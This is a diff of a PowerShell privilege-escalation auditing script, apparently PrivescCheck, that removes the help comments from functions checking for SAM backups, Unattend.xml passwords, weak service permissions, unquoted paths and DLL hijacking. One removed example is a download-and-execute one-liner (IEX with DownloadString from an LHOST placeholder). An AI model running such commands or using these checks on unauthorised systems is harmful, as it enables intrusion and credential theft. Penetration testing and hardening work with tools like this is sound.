         [switch]$Remote
@@ -4766,23 +3338,6 @@ function Invoke-GPPPasswordCheck {
 # BEGIN SENSITIVE FILES 
 # ----------------------------------------------------------------
 function Invoke-SamBackupFilesCheck {
-    <#
-    .SYNOPSIS
-
-    Checks common locations for the SAM/SYSTEM backup files and checks whether the current
-    user can read them.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The SAM/SYSTEM registry hives are stored as files in a known location:
-    'C:\windows\System32\config'. These files are locked by default so even SYSTEM can't read them
-    when the system is running. However, copies of these files can be created in other folders so
-    it's worth checking if these files are accessible. 
-    
-    #>
     
     [CmdletBinding()] param()
 
@@ -4810,31 +3365,6 @@ function Invoke-SamBackupFilesCheck {
 }
 
 function Invoke-UnattendFilesCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates Unattend files and extracts credentials 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Searches common locations for "Unattend.xml" files. When a file is found, it calls the custom 
-    "Get-UnattendSensitiveData" function to extract credentials from it. Note: credentials are only
-    returned if the password is not empty and not equal to "*SENSITIVE*DATA*DELETED*".
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-UnattendFilesCheck | fl
-
-    Type     : LocalAccount
-    Domain   : N/A
-    Username : John
-    Password : Password1
-    File     : C:\WINDOWS\Panther\Unattend.xml
-
-    #>
 
     [CmdletBinding()] param()
 
@@ -4869,30 +3399,6 @@ function Invoke-UnattendFilesCheck {
 # BEGIN INSTALLED PROGRAMS   
 # ----------------------------------------------------------------
 function Invoke-InstalledProgramsCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the applications that are not installed by default
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Uses the custom "Get-InstalledPrograms" function to get a filtered list of installed programs
-    and then returns each result as a simplified PS object, indicating the name and the path of 
-    the application.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-InstalledProgramsCheck | ft
-
-    Name            FullPath
-    ----            --------
-    Npcap           C:\Program Files\Npcap
-    Wireshark       C:\Program Files\Wireshark
-    
-    #>
     
     [CmdletBinding()] param()
 
@@ -4913,30 +3419,6 @@ function Invoke-InstalledProgramsCheck {
 }
 
 function Invoke-ModifiableProgramsCheck {
-    <#
-    .SYNOPSIS
-
-    Identifies applications which have a modifiable EXE of DLL file
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    For each non-default application, enumerates the .exe and .dll files that the current user has 
-    modify permissions on.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-ModifiableProgramsCheck | ft
-
-    ModifiablePath                      IdentityReference    Permissions
-    --------------                      -----------------    -----------
-    C:\Program Files\VulnApp\Packages   DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
-    C:\Program Files\VulnApp\app.exe    DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
-    C:\Program Files\VulnApp\foobar.dll DESKTOP-FEOHNOM\user {WriteOwner, Delete, WriteAttributes, Synchronize...}
-    
-    #>
     
     [CmdletBinding()] param()
 
@@ -4978,34 +3460,6 @@ function Invoke-ModifiableProgramsCheck {
 }
 
 function Invoke-ApplicationsOnStartupCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the applications which are run on startup
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-    
-    Applications can be run on startup or whenever a user logs on. They can be either configured
-    in the registry or by adding an shortcut file (.LNK) in a Start Menu folder. 
-    
-    .EXAMPLE
-    
-    PS C:\> Invoke-ApplicationsOnStartupCheck
-
-    Name         : SecurityHealth
-    Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityHealth
-    Data         : %windir%\system32\SecurityHealthSystray.exe
-    IsModifiable : False
-
-    Name         : VMware User Process
-    Path         : HKLM\Software\Microsoft\Windows\CurrentVersion\Run\VMware User Process
-    Data         : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
-    IsModifiable : False
-    
-    #>
 
     [CmdletBinding()] param()
 
@@ -5084,32 +3538,6 @@ function Invoke-ApplicationsOnStartupCheck {
 }
 
 function Invoke-ScheduledTasksCheck {
-    <#
-    .SYNOPSIS
-    
-    Enumrates scheduled tasks with a modifiable path
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    This function enumerates all the scheduled tasks which are visible by the current user. For 
-    each task, it extracts the command line and checks whether it contains a path pointing to a 
-    modifiable file.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-ScheduledTasksCheck
-
-    TaskName       : DummyTask
-    TaskPath       : \CustomTasks\DummyTask
-    TaskFile       : C:\Windows\System32\Tasks\CustomTasks\DummyTask
-    RunAs          : NT AUTHORITY\SYSTEM
-    Command        : C:\APPS\MyTask.exe
-    ModifiablePath : C:\APPS\
-    
-    #>
 
     [CmdletBinding()] param(
         [switch]$Filtered
@@ -5201,55 +3629,6 @@ function Invoke-ScheduledTasksCheck {
 }
 
 function Invoke-RunningProcessCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the running processes
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    First, it lists all the processes thanks to the built-in "Get-Process" function. Then, it 
-    filters the result in order to return only the non-default Windows processes. By default,
-    this function returns only process that are NOT owned by teh current user but you can 
-    use the "-Self" flag to get them. 
-    
-    .PARAMETER Self
-
-    Use this flag to get a list of all the process owned by the current user
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-RunningProcessCheck | ft
-
-    Name                   PID User Path SessionId
-    ----                   --- ---- ---- ---------
-    cmd                   4224 N/A               1
-    conhost               5336 N/A               1
-    ctfmon                7436 N/A               1
-    dllhost               3584 N/A               0
-    dllhost               4172 N/A               1
-    fontdrvhost            860 N/A               0
-    fontdrvhost            928 N/A               1
-    lsass                  732 N/A               0
-    MsMpEng               3524 N/A               0
-    MsMpEngCP             1132 N/A               0
-    NisSrv                4256 N/A               0
-    regedit               8744 N/A               1
-    SearchFilterHost      9360 N/A               0
-    SearchIndexer          596 N/A               0
-    SearchProtocolHost      32 N/A               0
-    SecurityHealthService 7980 N/A               0
-    SgrmBroker            9512 N/A               0
-    spoolsv               2416 N/A               0
-    TabTip                7456 N/A               1
-    wininit                564 N/A               0
-    winlogon               676 N/A               1
-    WmiPrvSE              3972 N/A               0
-
-    #>
     
     [CmdletBinding()] param(
         [switch]
@@ -5322,64 +3701,6 @@ function Invoke-RunningProcessCheck {
 # BEGIN SERVICES   
 # ----------------------------------------------------------------
 function Test-ServiceDaclPermission {
-    <#
-    .SYNOPSIS
-
-    Tests one or more passed services or service names against a given permission set,
-    returning the service objects where the current user have the specified permissions.
-
-    Author: @harmj0y, Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-
-    .DESCRIPTION
-
-    Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
-    a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
-    user are enumerated services where the user has some type of permission are filtered. The
-    services are then filtered against a specified set of permissions, and services where the
-    current user have the specified permissions are returned.
-
-    .PARAMETER Name
-
-    An array of one or more service names to test against the specified permission set.
-
-    .PARAMETER Permissions
-
-    A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
-    'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
-    'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
-    'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'
-
-    .PARAMETER PermissionSet
-
-    A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.
-
-    .OUTPUTS
-
-    ServiceProcess.ServiceController
-
-    .EXAMPLE
-
-    PS C:\> Get-Service | Test-ServiceDaclPermission
-
-    Return all service objects where the current user can modify the service configuration.
-
-    .EXAMPLE
-
-    PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'
-
-    Return all service objects that the current user can restart.
-
-
-    .EXAMPLE
-
-    PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'
-
-    Return the VulnSVC object if the current user has start permissions.
-
-    .LINK
-    https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-    #>
     [OutputType('ServiceProcess.ServiceController')]
     param (
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -5506,29 +3827,6 @@ function Test-ServiceDaclPermission {
 }
 
 function Invoke-InstalledServicesCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates non-default services
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    It uses the custom "Get-ServiceList" function to get a filtered list of services that are 
-    configured on the local machine. Then it returns each result in a custom PS object, 
-    indicating the name, display name, binary path, user and start mode of the service.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-InstalledServicesCheck | ft
-
-    Name    DisplayName  ImagePath                                           User        StartMode
-    ----    -----------  ---------                                           ----        ---------
-    VMTools VMware Tools "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" LocalSystem Automatic
-
-    #>
     
     [CmdletBinding()] param()
 
@@ -5553,36 +3851,6 @@ function Invoke-InstalledServicesCheck {
 }
 
 function Invoke-ServicesPermissionsRegistryCheck {
-    <#
-    .SYNOPSIS
-
-    Checks the permissions of the service settings in the registry
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The configuration of the services is maintained in the registry. Being able to modify these
-    registry keys means being able to change the settings of a service. In addition, a complete
-    machine reboot isn't necessary for these settings to be taken into account. Only the affected
-    service needs to be restarted. 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-ServicesPermissionsRegistryCheck 
-
-    Name              : VulnService
-    ImagePath         : C:\APPS\MyApp\service.exe
-    User              : LocalSystem
-    ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService}
-    IdentityReference : BUILTIN\Users
-    Permissions       : {WriteOwner, Delete, ReadControl, ReadData/ListDirectory...}
-    Status            : Unknown
-    UserCanStart      : False
-    UserCanRestart    : False
-
-    #>
     
     [CmdletBinding()] param()
     
@@ -5618,38 +3886,6 @@ function Invoke-ServicesPermissionsRegistryCheck {
 }
 
 function Invoke-ServicesUnquotedPathCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates all the services with an unquoted path. For each one of them, enumerates paths that 
-    the current user can modify. Based on the original "Get-ServiceUnquoted" function from 
-    PowerUp. 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    In my version of this function, I tried to eliminate as much false positives as possible.
-    PowerUp tends to report "C:\" as exploitable whenever a program located in "C:\Program 
-    Files" is identified. The problem is that we cannot write "C:\program.exe" so the service
-    wouldn't be exploitable. We can only create folders in "C:\" by default.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-ServicesUnquotedPathCheck
-
-    Name              : VulnService
-    ImagePath         : C:\APPS\My App\service.exe
-    User              : LocalSystem
-    ModifiablePath    : C:\APPS
-    IdentityReference : NT AUTHORITY\Authenticated Users
-    Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
-    Status            : Unknown
-    UserCanStart      : False
-    UserCanRestart    : False
-    
-    #>
     
     [CmdletBinding()] param()
 
@@ -5735,35 +3971,6 @@ function Invoke-ServicesUnquotedPathCheck {
 }
 
 function Invoke-ServicesImagePermissionsCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates all the services that have a modifiable binary (or argument)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    FIrst, it enumerates the services thanks to the custom "Get-ServiceList" function. For each
-    result, it checks the permissions of the ImagePath setting thanks to the "Get-ModifiablePath"
-    function. Each result is returned in a custom PS object. 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-ServicesImagePermissionsCheck
-
-    Name              : VulneService
-    ImagePath         : C:\APPS\service.exe
-    User              : LocalSystem
-    ModifiablePath    : C:\APPS\service.exe
-    IdentityReference : NT AUTHORITY\Authenticated Users
-    Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
-    Status            : Unknown
-    UserCanStart      : False
-    UserCanRestart    : False
-    
-    #>
     
     [CmdletBinding()] param()
     
@@ -5798,24 +4005,6 @@ function Invoke-ServicesImagePermissionsCheck {
 }
 
 function Invoke-ServicesPermissionsCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the services the current can modify through the service manager. In addition, it 
-    shows whether the service can be started/restarted. 
-    
-    Author: @itm4n
-    License: BSD 3-Clause
-
-    .DESCRIPTION
-
-    This is based on the original "Get-ModifiableService" from PowerUp.
-    
-    .LINK
-
-    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
-
-    #>
     
     [CmdletBinding()] param()
 
@@ -5857,20 +4046,6 @@ function Invoke-ServicesPermissionsCheck {
 # BEGIN DLL HIJACKING   
 # ----------------------------------------------------------------
 function Invoke-DllHijackingCheck {
-    <#
-    .SYNOPSIS
-
-    Checks whether any of the system path folders is modifiable
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    First, it reads the system environment PATH from the registry. Then, for each entry, it checks
-    whether the current user has write permissions.
-
-    #>
     
     [CmdletBinding()] param()
     
@@ -5887,58 +4062,6 @@ function Invoke-DllHijackingCheck {
 }
 
 function Invoke-HijackableDllsCheck {
-    <#
-    .SYNOPSIS
-
-    Lists hijackable DLLs depending on the version of the OS
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    On Windows, some services load DLLs without using a "secure" search path. Therefore, they 
-    try to load them from the folders listing in the %PATH% environment variable. If one of these
-    folders is configured with weak permissions, a local attacker may plant a malicious version of
-    a DLL in order to execute arbitrary code in the context of the service.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-HijackableDllsCheck
-
-    Name           : cdpsgshims.dll
-    Description    : Loaded by CDPSvc upon service startup
-    RunAs          : NT AUTHORITY\LOCAL SERVICE
-    RebootRequired : True
-
-    .EXAMPLE
-
-    PS C:\> Invoke-HijackableDllsCheck
-
-    Name           : windowsperformancerecordercontrol.dll
-    Description    : Loaded by DiagTrack upon service startup or shutdown
-    RunAs          : NT AUTHORITY\SYSTEM
-    RebootRequired : True
-
-    Name           : diagtrack_win.dll
-    Description    : Loaded by DiagTrack upon service startup
-    RunAs          : NT AUTHORITY\SYSTEM
-    RebootRequired : True
-
-    Name           : wlbsctrl.dll
-    Description    : Loaded by IKEEXT upon service startup
-    RunAs          : NT AUTHORITY\SYSTEM
-    RebootRequired : True
-
-    Name           : wlanhlp.dll
-    Description    : Loaded by NetMan when listing network interfaces
-    RunAs          : NT AUTHORITY\SYSTEM
-    RebootRequired : False
-
-    .LINK
-
-    https://www.reddit.com/r/hacking/comments/b0lr05/a_few_binary_plating_0days_for_windows/?utm_source=amp&utm_medium=&utm_content=post_title
-    #>
 
     [CmdletBinding()] param()
 
@@ -6117,38 +4240,6 @@ function Write-Banner {
 }
 
 function Invoke-PrivescCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates common security misconfigurations that can be exploited of privilege escalation
-    pourposes. 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    This script aims to identify security misconfigurations that are relevant for privilege 
-    escalation. It also provides some additional information that may help penetration testers to 
-    choose between several potential exploits. For example, if you find that a service is 
-    vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know
-    hos often the machine is rebooted (in the case of a server). If you see that it is rebooted 
-    every night for instance, you may want to attempt an exploit. 
-    
-    .EXAMPLE
-
-    PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 
-
-    .EXAMPLE 
-
-    C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"
-
-    .EXAMPLE
-
-    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-P
-    rivescCheck.ps1'; Invoke-PrivescCheck" 
-
-    #>
 
     [CmdletBinding()] param()
 
@@ -6611,13 +4702,6 @@ function Invoke-PrivescCheck {
 # ===========================================================================
 
 function Invoke-PrivescCheckColor {
-    <#
-    .SYNOPSIS
-        Run the embedded PrivescCheck with ANSI color-coded output.
-    .EXAMPLE
-        . .\PrivescCheck-Color.ps1; Invoke-PrivescCheckColor
-        . .\PrivescCheck-Color.ps1; Invoke-PrivescCheckColor -Extended -SeverityFilter Medium
-    #>
     [CmdletBinding()]
     param(
         [switch]$Extended,
